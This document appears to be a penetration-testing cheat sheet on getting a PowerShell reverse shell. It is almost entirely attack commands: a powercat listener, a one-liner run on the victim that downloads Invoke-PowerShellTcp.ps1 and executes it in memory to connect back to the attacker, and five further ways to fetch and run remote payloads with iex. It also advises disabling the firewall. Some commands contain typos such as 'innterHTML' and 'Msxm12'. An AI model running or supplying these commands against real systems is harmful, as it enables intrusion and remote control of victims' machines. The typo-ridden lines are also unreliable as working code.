---
description: PowerShell Reverse shell
---

# PowerShell Reverse shell

When we can execute commands on a box (for example from a Jenkins build) we can use powercat + invoke-powershelltcp to establish a reverse shell to our box:

1. Load powercat.ps1 and start a listener on the attacker machine:

```bash
. .\powercat.ps1
powercat -l -p 443 -t 1000 -Verbose
```

1. Host Invoke-PowerShellTcp.ps1 from our box (victim will download it):

```bash
execute the binary called hfs.exe
```

**Note:** Remember to disable firewall in case it doesn't work!!

1. Execute one of the following commands on the victim machine (it will be loaded in memory without touching disk):

```bash
powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
```

### Other ways of loading in-memory scripts

```bash
## Way 1:
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

## Way 2:
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://webserver/payload.ps1');sleep 5;$response=$ie.Document.body.innterHTML;$ie.quit();iex $response

## Way 3 (PSv3 onwards):
iex (iwr 'http://webserver/payload.ps1')

## Way 4:
$h=New-Object -ComObject Msxm12.XMLHTTP;$h.open('GET','http://webserver/payload.ps1',$false);$h.send();iex $h.responseText

## Way 5:
$wr = [System.NET.WebRequest]::Create("http://webserver/payload.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```
